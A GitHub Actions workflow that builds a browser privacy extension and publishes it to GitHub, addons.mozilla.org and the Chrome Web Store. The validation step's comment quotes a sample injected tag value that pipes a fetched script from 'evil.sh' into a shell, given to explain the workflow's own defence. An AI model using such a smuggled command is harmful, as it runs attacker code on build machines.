name: Release

on:
  push:
    tags: ['v*']
  workflow_dispatch:
    inputs:
      tag:
        description: 'Tag to build and publish, e.g. v1.0.0. Empty builds this ref without publishing.'
        type: string
        required: false
      publish:
        description: Upload to the stores (requires a v* tag and the store secrets)
        type: boolean
        default: false

permissions:
  contents: write

# Not a secret, and needed by the AMO version check.
env:
  AMO_SLUG: privacy-for-bale-web

jobs:
  package:
    name: Build and publish packages
    runs-on: ubuntu-latest
    steps:
      # Resolved and validated before anything else, because on a manual run the
      # input decides which code gets signed and shipped to the stores. Inputs
      # reach the shell through env rather than ${{ }} interpolation, so a value
      # like `v1.0.0"; curl evil.sh | sh; "` is data, never script.
      - name: Resolve and validate the ref
        id: ref
        env:
          INPUT_TAG: ${{ inputs.tag }}
          EVENT: ${{ github.event_name }}
          REF: ${{ github.ref }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          if [ -n "${INPUT_TAG:-}" ]; then
            if ! printf '%s' "$INPUT_TAG" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
              echo "::error::tag input must look like v1.2.3, got '$INPUT_TAG'"
              exit 1
            fi
            checkout="$INPUT_TAG"
            tag="$INPUT_TAG"
          elif [ "$EVENT" = "push" ]; then
            checkout="$REF"
            tag="$REF_NAME"
          else
            checkout="$REF"
            tag=""
          fi
          printf 'checkout=%s\n' "$checkout" >> "$GITHUB_OUTPUT"
          printf 'tag=%s\n' "$tag" >> "$GITHUB_OUTPUT"

      - uses: actions/checkout@v7
        with:
          ref: ${{ steps.ref.outputs.checkout }}

      - uses: actions/setup-node@v7
        with:
          node-version-file: .nvmrc
          cache: npm

      - run: npm ci

      - name: Verify
        run: npm run verify

      # Reports only whether the credentials exist. A step's own env is not in
      # scope for its own `if:`, so the publish steps below gate on these
      # outputs instead — which keeps the secrets out of `npm ci` and the build,
      # where a compromised dependency could read them.
      - name: Detect store credentials
        id: creds
        env:
          AMO_ISSUER: ${{ secrets.AMO_JWT_ISSUER }}
          CHROME_ID: ${{ secrets.CHROME_CLIENT_ID }}
        run: |
          set -euo pipefail
          if [ -n "${AMO_ISSUER:-}" ]; then echo 'amo=true' >> "$GITHUB_OUTPUT"; else echo 'amo=false' >> "$GITHUB_OUTPUT"; fi
          if [ -n "${CHROME_ID:-}" ]; then echo 'chrome=true' >> "$GITHUB_OUTPUT"; else echo 'chrome=false' >> "$GITHUB_OUTPUT"; fi

      - name: Read the version and decide what to publish
        id: plan
        env:
          TAG: ${{ steps.ref.outputs.tag }}
          EVENT: ${{ github.event_name }}
          WANT_PUBLISH: ${{ inputs.publish }}
        run: |
          set -euo pipefail
          version="$(node -p "require('./package.json').version")"
          printf 'version=%s\n' "$version" >> "$GITHUB_OUTPUT"

          # A tag in the version has to match the manifest, or users end up with
          # a package whose version disagrees with the release it came from.
          if [ -n "${TAG:-}" ] && [ "${TAG#v}" != "$version" ]; then
            echo "::error::Tag $TAG does not match package.json version $version"
            exit 1
          fi

          # Only a tag is ever published: a tag push always, a manual run when
          # asked. Building an arbitrary branch stays possible, shipping one does
          # not.
          publish=false
          if [ -n "${TAG:-}" ]; then
            if [ "$EVENT" = "push" ] || [ "${WANT_PUBLISH:-}" = "true" ]; then
              publish=true
            fi
          fi
          printf 'publish=%s\n' "$publish" >> "$GITHUB_OUTPUT"
          echo "ref=${TAG:-(untagged)} version=$version publish=$publish"

      - name: Package
        run: npm run package

      - name: Archive the sources for AMO review
        run: |
          git archive --format=zip --prefix=bale-privacy-source/ \
            -o "release/bale-privacy-source.zip" HEAD

      - uses: actions/upload-artifact@v7
        with:
          name: release-packages
          path: release/

      - name: Create the GitHub release
        if: startsWith(github.ref, 'refs/tags/v')
        uses: softprops/action-gh-release@v3
        with:
          files: release/*
          generate_release_notes: true

      # ---------------------------------------------------------------------
      # Stores. Each step is skipped when its credentials are absent, so the
      # workflow stays green in a fork and before a store is set up.
      # ---------------------------------------------------------------------

      - name: Check what addons.mozilla.org already has
        id: amo
        if: steps.plan.outputs.publish == 'true' && steps.creds.outputs.amo == 'true'
        env:
          VERSION: ${{ steps.plan.outputs.version }}
        run: |
          set -euo pipefail
          live="$(curl -fsSL "https://addons.mozilla.org/api/v5/addons/addon/$AMO_SLUG/" \
            | python3 -c 'import json,sys; print((json.load(sys.stdin).get("current_version") or {}).get("version",""))' || true)"
          echo "live version on AMO: ${live:-unknown}"
          if [ "$live" = "$VERSION" ]; then
            echo 'needed=false' >> "$GITHUB_OUTPUT"
            echo "::notice::AMO already has $VERSION, skipping upload"
          else
            echo 'needed=true' >> "$GITHUB_OUTPUT"
          fi

      - name: Publish to addons.mozilla.org
        if: steps.amo.outputs.needed == 'true'
        env:
          AMO_JWT_ISSUER: ${{ secrets.AMO_JWT_ISSUER }}
          AMO_JWT_SECRET: ${{ secrets.AMO_JWT_SECRET }}
        run: |
          set -euo pipefail

          # AMO answers a malformed credential with "Error decoding signature",
          # which says nothing about which half is wrong. Check the shape first
          # and say so plainly. Nothing here prints a credential, only lengths.
          issuer="$(printf '%s' "$AMO_JWT_ISSUER" | tr -d '[:space:]')"
          secret="$(printf '%s' "$AMO_JWT_SECRET" | tr -d '[:space:]')"

          if [ "${#issuer}" -ne "${#AMO_JWT_ISSUER}" ] || [ "${#secret}" -ne "${#AMO_JWT_SECRET}" ]; then
            echo "::warning::Whitespace was trimmed from an AMO credential. A value piped into 'gh secret set' keeps its trailing newline; use 'gh secret set NAME --body <value>' instead."
          fi

          if [ -z "$issuer" ] || [ -z "$secret" ]; then
            echo "::error::An AMO credential is empty. Set both under Settings > Secrets and variables > Actions."
            exit 1
          fi

          # The issuer format is documented and stable; a value that fails this
          # is almost always the secret pasted into the wrong box.
          if ! printf '%s' "$issuer" | grep -Eq '^user:[0-9]+:[0-9]+$'; then
            echo "::error::AMO_JWT_ISSUER should look like user:12345678:123 but is ${#issuer} characters. Check that the issuer and the secret were not swapped, then regenerate both at https://addons.mozilla.org/developers/addon/api/key/"
            exit 1
          fi

          if ! printf '%s' "$secret" | grep -Eq '^[0-9a-f]{32,}$'; then
            echo "::warning::AMO_JWT_SECRET is ${#secret} characters and not the usual long hex string. If the upload comes back Unauthorized, regenerate the credentials - the secret is shown only once."
          fi

          # --upload-source-code is required because the shipped bundles are
          # minified by esbuild; reviewers need the readable sources.
          # --approval-timeout 0 returns as soon as the upload is accepted
          # instead of blocking the job until a human review finishes.
          npx --yes web-ext sign \
            --source-dir dist/firefox \
            --artifacts-dir release \
            --channel listed \
            --upload-source-code "release/bale-privacy-source.zip" \
            --approval-timeout 0 \
            --api-key "$issuer" \
            --api-secret "$secret"

      - name: Publish to the Chrome Web Store
        if: steps.plan.outputs.publish == 'true' && steps.creds.outputs.chrome == 'true'
        env:
          VERSION: ${{ steps.plan.outputs.version }}
          CHROME_CLIENT_ID: ${{ secrets.CHROME_CLIENT_ID }}
          CHROME_CLIENT_SECRET: ${{ secrets.CHROME_CLIENT_SECRET }}
          CHROME_REFRESH_TOKEN: ${{ secrets.CHROME_REFRESH_TOKEN }}
          CHROME_EXTENSION_ID: ${{ secrets.CHROME_EXTENSION_ID }}
        run: |
          set -euo pipefail
          npx --yes chrome-webstore-upload-cli@3 upload \
            --source "release/bale-privacy-$VERSION-chrome.zip" \
            --extension-id "$CHROME_EXTENSION_ID" \
            --client-id "$CHROME_CLIENT_ID" \
            --client-secret "$CHROME_CLIENT_SECRET" \
            --refresh-token "$CHROME_REFRESH_TOKEN" \
            --auto-publish

      - name: Summary
        if: always()
        env:
          VERSION: ${{ steps.plan.outputs.version }}
          TAG: ${{ steps.ref.outputs.tag }}
          RELEASED: ${{ startsWith(github.ref, 'refs/tags/v') }}
          AMO_DONE: ${{ steps.amo.outputs.needed }}
          CHROME_READY: ${{ steps.creds.outputs.chrome }}
          PUBLISH: ${{ steps.plan.outputs.publish }}
        run: |
          set -euo pipefail
          {
            echo "### Release ${VERSION:-unknown} (${TAG:-untagged})"
            echo
            echo "| Target | Result |"
            echo "| --- | --- |"
            echo "| GitHub release | $([ "$RELEASED" = 'true' ] && echo created || echo 'skipped (not a tag push)') |"
            echo "| addons.mozilla.org | $([ "$AMO_DONE" = 'true' ] && echo uploaded || echo skipped) |"
            echo "| Chrome Web Store | $([ "$PUBLISH" = 'true' ] && [ "$CHROME_READY" = 'true' ] && echo uploaded || echo 'skipped') |"
          } >> "$GITHUB_STEP_SUMMARY"
